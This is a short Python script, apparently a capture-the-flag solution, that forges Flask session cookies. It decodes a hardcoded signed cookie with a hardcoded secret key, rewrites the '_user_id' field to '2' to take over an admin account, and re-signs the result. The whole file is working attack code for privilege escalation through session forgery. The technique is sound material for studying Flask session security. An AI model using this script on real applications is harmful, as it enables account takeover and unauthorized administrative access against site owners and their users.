#!/usr/bin/env python3
# -*- coding:utf-8 -*-
# this code is refer to bellow site
#   https://qiita.com/koki-sato/items/6ff94197cf96d50b5d8f#flask-%E3%81%AE%E3%82%BB%E3%83%83%E3%82%B7%E3%83%A7%E3%83%B3%E6%94%B9%E3%81%96%E3%82%93

import zlib
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import base64_decode, URLSafeTimedSerializer

secret_key = 'e03c9698104e6081f4c5892aad939e45'
cookie = '.eJwljkGKAzEMBP_icw6SLdtSPjNIlkRCIIGZ5LTs33fCXgq6Dk39lC33OG7l-t4_cSnb3cu1OPdFOjI7goAnJzpXRW2BA70BdpsmCiiMAYuiJoTXaTyYSNyth7PqFDeIibm0d_3eNVlDwWF5HTN5muoJ7K6rW0QNwuRyhnyO2P9r2jnXsef2fj3i-RUxajNMUmmWxNJJqUYGLZmeVRuhwaTy-weGIkC4.YSH48Q.p4ki-YdhHPMlziL7NedwMuKRkHo'

class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
    # NOTE: Override method
    def get_signing_serializer(self, secret_key):
        signer_kwargs = {
            'key_derivation': self.key_derivation,
            'digest_method': self.digest_method
        }
        return URLSafeTimedSerializer(
            secret_key,
            salt=self.salt,
            serializer=self.serializer,
            signer_kwargs=signer_kwargs
        )

class FlaskSessionCookieManager:
    @classmethod
    def decode(cls, secret_key, cookie):
        sscsi = SimpleSecureCookieSessionInterface()
        signingSerializer = sscsi.get_signing_serializer(secret_key)
        return signingSerializer.loads(cookie)

    @classmethod
    def encode(cls, secret_key, session):
        sscsi = SimpleSecureCookieSessionInterface()
        signingSerializer = sscsi.get_signing_serializer(secret_key)
        return signingSerializer.dumps(session)

# main
user_session = FlaskSessionCookieManager.decode(secret_key, cookie)
print(user_session)
admin_session = user_session
admin_session['_user_id'] = '2'  # ここで書き換え
print(admin_session)
admin_cookie = FlaskSessionCookieManager.encode(secret_key, admin_session)
print(admin_cookie)
